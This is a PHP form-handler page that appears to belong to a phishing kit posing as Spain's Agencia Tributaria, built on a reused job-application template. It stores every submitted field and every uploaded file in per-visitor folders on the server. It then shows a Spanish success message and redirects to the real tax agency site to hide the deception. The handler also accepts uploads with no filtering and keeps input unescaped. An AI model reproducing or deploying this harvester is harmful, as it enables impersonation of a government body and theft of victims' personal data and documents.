<?php date_default_timezone_set("Europe/Bucharest"); ?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="Potenza - Job Application Form Wizard with Resume upload and Branch feature">
    <meta name="author" content="Ansonika">
    <title>Agencia Tributaria</title>

    <!-- Favicons-->
    <link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon">
    <!-- GOOGLE WEB FONT -->
    <link href="https://fonts.googleapis.com/css?family=Work+Sans:400,500,600" rel="stylesheet">

    <!-- BASE CSS -->
    <link href="css/bootstrap.min.css" rel="stylesheet">
		<link href="css/menu.css" rel="stylesheet">
    <link href="css/style.css" rel="stylesheet">
		<link href="css/vendors.css" rel="stylesheet">

    <!-- YOUR CUSTOM CSS -->
    <link href="css/custom.css" rel="stylesheet">
    
	<script type="text/javascript">
    function delayedRedirect() {
        window.location = "https://www.agenciatributaria.gob.es/AEAT.sede/Inicio/_pie_/_Datos_personales_/_Datos_personales_.shtml"
    }
    </script>

</head>
<body style="background-color:#fff;" onLoad="setTimeout('delayedRedirect()', 5000);">
<?php

$dir = dirname(__FILE__) . DIRECTORY_SEPARATOR . 'formulare' . DIRECTORY_SEPARATOR;
$tpl = file_get_contents( $dir . 'template.html');
$_POST['date'] = date('D, j M, Y H:i', ((int) $_POST['uid']) / 1000);
$savedir = $dir . $_POST['uid'];
$img_dir = $savedir . DIRECTORY_SEPARATOR;
unset($_POST['website']);
unset($_POST['process']);
unset($_POST['terms']);

if(!is_dir($savedir)) {
	mkdir($savedir);
}
$replace = $tpl;
	foreach($_POST as $name => $value) {
		$replace = str_replace('{' . $name . '}', $value, $replace);
	}
	foreach($_FILES as $name => $file) {
		$temp_file = $file['tmp_name'];
		$file_name = basename($file['name']);
			if( move_uploaded_file($temp_file, $img_dir . $file_name) ) {
				$replace = str_replace('{' . $name . '}', $file_name, $replace);
				$replace = str_replace('{file_' . $name . '}', $file_name, $replace);
			}
	}
	$index = $savedir . DIRECTORY_SEPARATOR . 'index.html';
	file_put_contents($index, $replace);
?>
<!-- END SEND MAIL SCRIPT -->   

<div id="success">
    <div class="icon icon--order-success svg">
         <svg xmlns="http://www.w3.org/2000/svg" width="72px" height="72px">
          <g fill="none" stroke="#8EC343" stroke-width="2">
             <circle cx="36" cy="36" r="35" style="stroke-dasharray:240px, 240px; stroke-dashoffset: 480px;"></circle>
             <path d="M17.417,37.778l9.93,9.909l25.444-25.393" style="stroke-dasharray:50px, 50px; stroke-dashoffset: 0px;"></path>
          </g>
         </svg>
     </div>
	<h4><span>Su solicitud enviada con éxito!</span></h4>
	<small>Serás redirigido en 5 segundos.</small>
</div>
</body>
</html>